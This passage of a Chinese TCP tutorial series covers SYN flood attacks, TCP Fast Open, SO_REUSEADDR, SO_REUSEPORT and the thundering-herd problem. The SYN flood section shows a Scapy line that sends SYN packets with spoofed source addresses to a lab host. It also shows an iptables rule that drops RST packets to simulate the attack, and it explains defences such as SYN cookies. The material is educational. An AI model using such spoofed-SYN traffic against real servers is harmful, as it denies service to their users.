<h2 id="15-原始但德高望重的-DDoS-攻击方式-——-SYN-Flood-攻击原理"><a href="#15-原始但德高望重的-DDoS-攻击方式-——-SYN-Flood-攻击原理" class="headerlink" title="15 原始但德高望重的 DDoS 攻击方式 —— SYN Flood 攻击原理"></a>15 原始但德高望重的 DDoS 攻击方式 —— SYN Flood 攻击原理</h2><h3 id="Scapy-工具介绍"><a href="#Scapy-工具介绍" class="headerlink" title="Scapy 工具介绍"></a>Scapy 工具介绍</h3><h3 id="SYN-flood-攻击"><a href="#SYN-flood-攻击" class="headerlink" title="SYN flood 攻击"></a>SYN flood 攻击</h3><p>SYN Flood 是一种广为人知的 <code>DoS</code>（拒绝服务攻击:<code>Denial of Service</code>） 想象一个场景：客户端大量伪造 IP 发送 SYN 包，服务端回复的 ACK+SYN 去到了一个「未知」的 IP 地址，势必会造成服务端大量的连接处于 SYN_RCVD 状态，而服务器的<code>半连接队列大小</code>也是有限的，如果半连接队列满，也会出现<code>无法处理正常请求</code>的情况。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/87.jpg"></p>
<p>在客户端用 scapy 执行的 sr1 函数向目标机器（10.211.55.5）发起 SYN 包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sr1(IP(src&#x3D;&quot;23.16.*.*&quot;, dst&#x3D;&quot;10.211.55.10&quot;) &#x2F; TCP(dport&#x3D;80, flags&#x3D;&quot;S&quot;) )</span><br></pre></td></tr></table></figure>
<p>其中服务端收到的 SYN 包的源地址将会是 23.16 网段内的<code>随机 IP</code>，隐藏了自己的 IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnpat | grep :80</span><br><span class="line"></span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 10.211.55.10:80         23.16.63.3:20           SYN_RECV    -</span><br><span class="line">tcp        0      0 10.211.55.10:80         23.16.64.3:20           SYN_RECV    -</span><br><span class="line">tcp        0      0 10.211.55.10:80         23.16.62.3:20           SYN_RECV    -</span><br></pre></td></tr></table></figure>
<p>在服务端抓包看到下面的抓包</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/88.jpg"></p>
<p>可以看到短时间内，服务端收到了很多虚假 IP 的 <code>SYN</code> 包，马上回复了 SYN+ACK 给这些虚假 IP 的服务器。这些虚假的 IP 当然一脸懵逼，我都没发 SYN，你给我发 <code>SYN+ACK</code> 干嘛，于是马上回了 <code>RST</code>。</p>
<p>使用 netstat 查看服务器的状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnpat | grep :80</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 10.211.55.10:80         23.16.63.3:20           SYN_RECV    -</span><br><span class="line">tcp        0      0 10.211.55.10:80         23.16.64.3:20           SYN_RECV    -</span><br><span class="line">tcp        0      0 10.211.55.10:80         23.16.62.3:20           SYN_RECV    -</span><br></pre></td></tr></table></figure>
<p>服务端的 SYN_RECV 的数量偶尔涨起来又降下去，因为对端回了 <code>RST</code> 包，这条连接在收到 RST 以后就被从半连接队列清除了。如果攻击者控制了大量的机器，同时发起 SYN，依然会对服务器造成不小的影响。</p>
<p>而且 <code>SYN+ACK</code> 去到的不知道是哪里的主机，是否回复 RST 完全取决于它自己，万一它不直接忽略掉 SYN，不回复 RST，问题就更严重了。服务端以为自己的 SYN+ACK 丢失了，会进行重传。</p>
<p>我们来模拟一下这种场景。因为没有办法在去 <code>SYN+ACK</code> 包去到的主机的配置，可以在服务器用 <code>iptables</code> 墙掉主机发过来的 RST 包，模拟主机没有回复 RST 包的情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  iptables --append INPUT  --match tcp --protocol tcp --dst 10.211.55.10 --dport 80 --tcp-flags RST RST --jump DROP</span><br></pre></td></tr></table></figure>
<p>这个时候再次使用 <code>netstat</code> 查看，满屏的 <code>SYN_RECV</code> 出现了</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/89.jpg"></p>
<p>通过服务端抓包的文件也可以看到，服务端因为 <code>SYN+ACK </code>丢了，然后进行重传。重传的次数由<code>/proc/sys/net/ipv4/tcp_synack_retries</code>文件决定，在我的 Centos 上这个默认值为 <code>5</code>。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/90.jpg"></p>
<p>重传 5 次 <code>SYN+ACK</code> 包，重传的时间依然是指数级退避（1s、2s、4s、8s、16s），发送完最后一次 <code>SYN+ACK</code> 包以后，等待 32s，服务端才会丢弃掉这个连接，把处于<code>SYN_RECV</code> 状态的 socket 关闭。</p>
<p>在这种情况下，一次恶意的 SYN 包，会占用一个服务端连接 63s（<code>1+2+4+8+16+32</code>），如果这个时候有大量的恶意 SYN 包过来连接服务器，很快半连接队列就被占满，不能接收正常的用户请求。</p>
<h3 id="如何应对-SYN-Flood-攻击"><a href="#如何应对-SYN-Flood-攻击" class="headerlink" title="如何应对 SYN Flood 攻击"></a>如何应对 SYN Flood 攻击</h3><p>常见的有下面这几种方法</p>
<p>1.增加 SYN 连接数：tcp_max_syn_backlog</p>
<p>调大<code>net.ipv4.tcp_max_syn_backlog</code>的值，不过这只是一个心理安慰，真有攻击的时候，这个再大也不够用。</p>
<p>2.减少SYN+ACK重试次数：tcp_synack_retries</p>
<p>重试次数由 <code>/proc/sys/net/ipv4/tcp_synack_retries</code>控制，默认情况下是 <code>5 </code>次，当收到<code>SYN+ACK</code>故意不回 ACK 或者回复的很慢的时候，调小这个值很有必要。</p>
<p>3.SYN Cookie 机制</p>
<h3 id="SYN-Cookie-机制"><a href="#SYN-Cookie-机制" class="headerlink" title="SYN Cookie 机制"></a>SYN Cookie 机制</h3><p>SYN Cookie 技术最早是在 1996 年提出的，最早就是用来解决 <code>SYN Flood</code> 攻击的，现在服务器上的 tcp_syncookies 都是默认等于 1，表示连接队列满时启用，等于 0 表示禁用，等于 2 表示始终启用。由<code>/proc/sys/net/ipv4/tcp_syncookies</code>控制。</p>
<p>SYN Cookie 机制其实原理比较简单，就是在三次握手的最后阶段才分配连接资源，如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/91.jpg"></p>
<p>SYN Cookie 的原理是基于「无状态」的机制，服务端收到 SYN 包以后不马上分配为 <code>Inbound SYN</code>分配内存资源，而是根据这个 SYN 包计算出一个 Cookie 值，作为握手第二步的序列号回复 SYN+ACK，等对方回应 ACK 包时校验回复的 ACK 值是否合法，如果合法才三次握手成功，分配连接资源。</p>
<p>SYN Cookie 看起来比较完美，但是也有不少的问题。</p>
<p>第一，这里的 MSS 值只能是少数的几种，由数组 msstab 值决定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static __u16 const msstab[] &#x3D; &#123;</span><br><span class="line">	536,</span><br><span class="line">	1300,</span><br><span class="line">	1440,	&#x2F;* 1440, 1452: PPPoE *&#x2F;</span><br><span class="line">	1460,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>第二，因为 syn-cookie 是一个无状态的机制，服务端不保存状态，不能使用其它所有 TCP 选项，比如 WScale，SACK 这些。因此要想变相支持这些选项就得想想其它的偏门，如果启用了 Timestamp 选项，可以把这些值放在 Timestamp 选项值里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-------+-------+--------+</span><br><span class="line">|  26 bits  | 1 bit | 1 bit | 4 bits |</span><br><span class="line">| Timestamp |  ECN  | SACK  | WScale |</span><br><span class="line">+-----------+-------+-------+--------+</span><br></pre></td></tr></table></figure>
<p>不在上面这个四个字段中的扩展选项将无法支持了，如果没有启用 Timestamp 选项，那就彻底凉凉了。</p>
<h3 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h3><p>这篇文章介绍了用 Scapy 工具构造 SYN Flood 攻击，然后介绍了缓解 SYN Flood 攻击的几种方式，有利有弊，看实际场景启用不同的策略。</p>
<h2 id="16-嫌三次握手太慢-——-来快速打开吧"><a href="#16-嫌三次握手太慢-——-来快速打开吧" class="headerlink" title="16 嫌三次握手太慢 —— 来快速打开吧"></a>16 嫌三次握手太慢 —— 来快速打开吧</h2><h3 id="TFO-简介"><a href="#TFO-简介" class="headerlink" title="TFO 简介"></a>TFO 简介</h3><p>TFO 是在原来 TCP 协议上的扩展协议，它的主要原理就在发送第一个 SYN 包的时候就开始传数据了，不过它要求当前客户端之前已经完成过「正常」的三次握手。快速打开分两个阶段：请求 <code>Fast Open Cookie</code> 和 真正开始 <code>TCP Fast Open</code></p>
<p>请求 Fast Open Cookie 的过程如下：</p>
<p>1.客户端发送一个 SYN 包，头部包含 Fast Open 选项，且该选项的Cookie 为空，这表明客户端请求 <code>Fast Open Cookie</code></p>
<p>2.服务端收取 SYN 包以后，生成一个 cookie 值（一串字符串）</p>
<p>3.服务端发送 <code>SYN + ACK</code> 包，在 Options 的 Fast Open 选项中设置 cookie 的值</p>
<p>4.客户端缓存服务端的 IP 和收到的 cookie 值</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/92.jpg"></p>
<p>第一次过后，客户端就有了缓存在本地的 cookie 值，后面的握手和数据传输过程如下：</p>
<p>客户端发送 SYN 数据包，里面包含数据和之前缓存在本地的 Fast Open Cookie。（注意我们此前介绍的所有 SYN 包都不能包含数据）</p>
<p>服务端检验收到的 TFO Cookie 和传输的数据是否合法。如果合法就会返回 SYN + ACK 包进行确认并将数据包传递给应用层，如果不合法就会丢弃数据包，走正常三次握手流程（只会确认 SYN）</p>
<p>服务端程序收到数据以后可以握手完成之前发送响应数据给客户端了</p>
<p>客户端发送 ACK 包，确认第二步的 SYN 包和数据（如果有的话）</p>
<p>后面的过程就跟非 TFO 连接过程一样了</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/93.jpg"></p>
<h3 id="抓包演示"><a href="#抓包演示" class="headerlink" title="抓包演示"></a>抓包演示</h3><h4 id="第一次：请求-Fast-Open-Cookie"><a href="#第一次：请求-Fast-Open-Cookie" class="headerlink" title="第一次：请求 Fast Open Cookie"></a>第一次：请求 Fast Open Cookie</h4><h4 id="第二次：真正的快速打开"><a href="#第二次：真正的快速打开" class="headerlink" title="第二次：真正的快速打开"></a>第二次：真正的快速打开</h4><h3 id="TCP-Fast-Open-的优势"><a href="#TCP-Fast-Open-的优势" class="headerlink" title="TCP Fast Open 的优势"></a>TCP Fast Open 的优势</h3><p>一个最显著的优点是可以利用握手<code>去除一个往返 RTT</code>，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/94.jpg"></p>
<p>在开启 TCP Fast Open以后，从第二次请求开始，就可以在一个 RTT 时间拿到响应的数据。</p>
<p>还有一些其它的优点，比如可以防止 SYN-Flood 攻击之类的</p>
<h3 id="代码中是怎么使用的-Fast-Open"><a href="#代码中是怎么使用的-Fast-Open" class="headerlink" title="代码中是怎么使用的 Fast Open"></a>代码中是怎么使用的 Fast Open</h3><p>用 strace 命令来看一下 curl 的过程</p>
<p>加上 –tcp-fastopen 选项以后的 strace 输出<code>sudo strace curl --tcp-fastopen http://test.ya.me</code> 可以看到客户端没有使用 connect 建连，而是直接调用了 <code>sendto</code> 函数，加上了 MSG_FASTOPEN flag 连接服务端同时发送数据。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/95.jpg"></p>
<p>没有加上 <code>--tcp-fastopen</code> 选项的情况下的 strace 输出如下 sudo strace curl <a target="_blank" rel="noopener" href="http://test.ya.me/">http://test.ya.me</a><br><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/96.jpg"></p>
<p>在没有启用 <code>Fast Open</code> 的情况下，会先调用 <code>connect</code> 进行握手</p>
<h2 id="17-Address-already-in-use-——-聊聊-Socket-选项之-SO-REUSEADDR"><a href="#17-Address-already-in-use-——-聊聊-Socket-选项之-SO-REUSEADDR" class="headerlink" title="17 Address already in use —— 聊聊 Socket 选项之 SO_REUSEADDR"></a>17 Address already in use —— 聊聊 Socket 选项之 SO_REUSEADDR</h2><p>前面介绍到四次挥手的时候有讲到，主动断开连接的那一端需要等待 2 个 MSL 才能最终释放这个连接。一般而言，主动断开连接的都是客户端，如果是<code>服务端程序重启</code>或者<code>出现 bug 崩溃</code>，这时服务端会主动断开连接，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/97.jpg"></p>
<p>因为要等待 2 个 MSL 才能最终释放连接，所以如果这个时候程序马上启动，就会出现<code>Address already in use</code>错误。要过 1 分钟以后才可以启动成功。如果你写了一个 web 服务器，崩溃以后被脚本自动拉起失败，需要等一分钟才正常，运维可能要骂娘了。</p>
<p>下面来写一段简单的代码演示这个场景是如何产生的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class ReuseAddress &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ServerSocket serverSocket &#x3D; new ServerSocket();</span><br><span class="line">        &#x2F;&#x2F; setReuseAddress 必须在 bind 函数调用之前执行</span><br><span class="line">        serverSocket.setReuseAddress(false);</span><br><span class="line">        serverSocket.bind(new InetSocketAddress(8080));</span><br><span class="line">        System.out.println(&quot;reuse address: &quot; + serverSocket.getReuseAddress());</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            Socket socket &#x3D; serverSocket.accept();</span><br><span class="line">            System.out.println(&quot;incoming socket..&quot;);</span><br><span class="line">            OutputStream out &#x3D; socket.getOutputStream();</span><br><span class="line">            out.write(&quot;Hello\n&quot;.getBytes());</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的功能是启动一个 TCP 服务器，客户端连上来就返回了一个 “Hello\n” 回去。</p>
<p>使用 javac 编译 class 文件<code>javac ReuseAddress.java;</code>，然后用 java 命令运行<code>java -cp . ReuseAddress</code>。使用 nc 命令连接 8080 端口<code>nc localhost 8080</code>，应该会马上收到服务端返回的”Hello\n”字符串。现在 kill 这个进程，马上重启这个程序就可以看到程序启动失败，报 socket bind 失败，堆栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.net.BindException: 地址已在使用 (Bind failed)</span><br><span class="line">	at java.net.PlainSocketImpl.socketBind(Native Method)</span><br><span class="line">	at java.net.AbstractPlainSocketImpl.bind(AbstractPlainSocketImpl.java:387)</span><br><span class="line">	at java.net.ServerSocket.bind(ServerSocket.java:375)</span><br><span class="line">	at java.net.ServerSocket.bind(ServerSocket.java:329)</span><br><span class="line">	at ReuseAddress.main(ReuseAddress.java:18)</span><br></pre></td></tr></table></figure>
<p>将代码修改为<code>serverSocket.setReuseAddress(true);</code>，再次重复上面的测试过程，再也不会出现上述异常了。</p>
<h3 id="0x02-为什么需要-SO-REUSEADDR-参数"><a href="#0x02-为什么需要-SO-REUSEADDR-参数" class="headerlink" title="0x02 为什么需要 SO_REUSEADDR 参数"></a>0x02 为什么需要 SO_REUSEADDR 参数</h3><p>服务端主动断开连接以后，需要等 2 个 MSL 以后才最终释放这个连接，重启以后要绑定同一个端口，默认情况下，操作系统的实现都会阻止新的监听套接字绑定到这个端口上。</p>
<p>我们都知道 TCP 连接由四元组唯一确定。形式如下</p>
<p>{local-ip-address:local-port , foreign-ip-address:foreign-port}</p>
<p>一个典型的例子如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/98.jpg"></p>
<p>TCP 要求这样的四元组必须是唯一的，但大多数操作系统的实现要求更加严格，只要还有连接在使用这个本地端口，则本地端口不能被重用（<code>bind 调用失败</code>）</p>
<p>启用 <code>SO_REUSEADDR</code> 套接字选项可以解除这个限制，默认情况下这个值都为 0，表示关闭。在 Java 中，reuseAddress 不同的 JVM 有不同的实现，在我本机上，这个值默认为 1 允许端口重用。但是为了保险起见，写 TCP、HTTP 服务一定要主动设置这个<code>参数为 1</code>。</p>
<h3 id="0x03-是不是只有处于-TIME-WAIT-才允许端口复用？"><a href="#0x03-是不是只有处于-TIME-WAIT-才允许端口复用？" class="headerlink" title="0x03 是不是只有处于 TIME_WAIT 才允许端口复用？"></a>0x03 是不是只有处于 TIME_WAIT 才允许端口复用？</h3><p>不一定是要处于 <code>TIME_WAIT</code> 才允许端口复用的，只是大都是情况下，主动关闭连接的服务端都会处于 <code>TIME_WAIT</code>。如果不把 <code>SO_REUSEADDR</code> 设置为 1，服务器将等待 2 个 MSL 才可以重新绑定原端口</p>
<h3 id="0x04-为什么通常不会在客户端上出现"><a href="#0x04-为什么通常不会在客户端上出现" class="headerlink" title="0x04 为什么通常不会在客户端上出现"></a>0x04 为什么通常不会在客户端上出现</h3><p>通常情况下都是客户端主动关闭连接，那客户端那边为什么不会有问题呢？</p>
<p>因为客户端都是用的<code>临时端口</code>，这些临时端口与处于<code> TIME_WAIT</code> 状态的端口恰好相同的可能性不大，就算相同换一个新的临时端口就好了。</p>
<h3 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要讲了 SO_REUSEADDR 套接字属性出现的背景和分析，随后讲解了为什么需要 SO_REUSEADDR 参数，以及为什么客户端不需要关心这个参数。</p>
<h2 id="18-一台主机上两个进程可以同时监听同一个端口吗"><a href="#18-一台主机上两个进程可以同时监听同一个端口吗" class="headerlink" title="18 一台主机上两个进程可以同时监听同一个端口吗"></a>18 一台主机上两个进程可以同时监听同一个端口吗</h2><h3 id="SO-REUSEPORT-是什么"><a href="#SO-REUSEPORT-是什么" class="headerlink" title="SO_REUSEPORT 是什么"></a>SO_REUSEPORT 是什么</h3><p>默认情况下，一个 IP、端口组合只能被一个套接字绑定，Linux 内核从 3.9 版本开始引入一个新的 socket 选项 SO_REUSEPORT，又称为 port sharding，允许多个套接字监听同一个IP 和端口组合。</p>
<p>为了充分发挥多核 CPU 的性能，多进程的处理网络请求主要有下面两种方式</p>
<p>1.主进程 + 多个 worker 子进程监听相同的端口</p>
<p>2.多进程 + REUSEPORT</p>
<p>第一种方最常用的一种模式，Nginx 默认就采用这种方式。主进程执行 <code>bind()</code>、<code>listen()</code> 初始化套接字，然后 <code>fork</code> 新的子进程。在这些子进程中，通过 <code>accept</code>/<code>epoll_wait</code> 同一个套接字来进行请求处理，示意图如下所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/99.jpg"></p>
<p>这种方式看起来很完美，但是会带来著名的“惊群”问题（thundering herd）。</p>
<h3 id="惊群问题（thundering-herd）"><a href="#惊群问题（thundering-herd）" class="headerlink" title="惊群问题（thundering herd）"></a>惊群问题（thundering herd）</h3><p>在开始介绍惊群之前，我们下来看看一个现实世界中的惊群问题。假如你养了五条狗，一开始这五条狗都在睡觉，你过去扔了一块骨头，这五条狗都从睡梦中醒来，一起跑过来争抢这块骨头，最终只有第三条狗抢到了这块骨头，剩下的四条狗只好无奈的继续睡觉。如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/100.jpg"></p>
<p>从上面的例子可以看到，明明只有一块骨头只够一条小狗吃，五只小狗却一起从睡眠中醒来争抢，对于没有抢到小狗来说，浪费了很多精力。</p>
<p>计算机中的惊群问题指的是：多进程/多线程同时监听同一个套接字，当有网络事件发生时，所有等待的进程/线程同时被唤醒，但是只有其中一个进程/线程可以处理该网络事件，其它的进程/线程获取失败重新进入休眠。</p>
<p>惊群问题带来的是 <code>CPU 资源的浪费和锁竞争的开销</code>。根据使用方式的不同，Linux 上的网络惊群问题分为 <code>accept 惊群</code>和 <code>epoll 惊群</code>两种。</p>
<h3 id="accept-惊群"><a href="#accept-惊群" class="headerlink" title="accept 惊群"></a>accept 惊群</h3><p>Linux 在早期的版本中，多个进程 accept 同一个套接字会出现惊群问题，以下面的代码为例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int main(void) &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  servaddr.sin_port &#x3D; htons (9090);</span><br><span class="line">  bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));</span><br><span class="line">  listen(listenfd, 5);</span><br><span class="line">  clilen &#x3D; sizeof(cliaddr);</span><br><span class="line"></span><br><span class="line">  for (int i &#x3D; 0; i &lt; 4; ++i) &#123;</span><br><span class="line">	if ((fork()) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">	  &#x2F;&#x2F; 子进程</span><br><span class="line">	  printf(&quot;child pid: %d\n&quot;, getpid());</span><br><span class="line">	  while (1) &#123;</span><br><span class="line">		connfd &#x3D; accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;clilen);</span><br><span class="line">		sleep(2);</span><br><span class="line">		printf(&quot;processing, pid is %d\n&quot;, getpid());</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sleep(-1);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行 <code>nc -i 1 localhost 9090</code>，输出结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">child pid: 25050</span><br><span class="line">child pid: 25051</span><br><span class="line">child pid: 25052</span><br><span class="line">child pid: 25053</span><br><span class="line">processing, pid is 25050</span><br></pre></td></tr></table></figure>
<p>可以看到当有网络请求到来时，只会唤醒了其中一个子进程，其他的进程继续休眠阻塞在 <code>accept</code> 调用上，没有被唤醒，这种情况下，accept 系统调用不存在惊群现象。这是因为 Linux 在 2.6 内核版本之前监听同一个 socket 的多个进程在事件发生时会唤醒所有等待的进程，在 2.6 版本中引入了 <code>WQ_FLAG_EXCLUSIVE</code> 选项解决了 <code>accept</code> 调用的惊群问题。</p>
<p>不幸的是现在高性能的服务基本上都使用 <code>epoll</code> 方案来处理非阻塞 IO，接下来我们来看 epoll 惊群。</p>
<h3 id="epoll-惊群"><a href="#epoll-惊群" class="headerlink" title="epoll 惊群"></a>epoll 惊群</h3><p>epoll 典型的工作模式是父进程执行 bind、listen 以后 fork 出子进程，使用 <code>epoll_wait</code> 等待事件发生，模式如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/101.jpg"></p>
<p>经过 for 循环的 fork，会生成 4 个子进程，这 4 个子进程会继承父进程的 fd。在这种情况下，对应的进程文件描述符表、打开文件表和 inode 表的关系如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/102.jpg"></p>
<p>子进程的 <code>epoll_wait</code> 等待同一个底层的 <code>open file table</code> 项，当有事件发送时，会通知到所有的子进程。</p>
<p>编译运行上面的，使用 <code>nc -i 1 localhost 9090</code>发起网络请求，输出结果如下所示。</p>
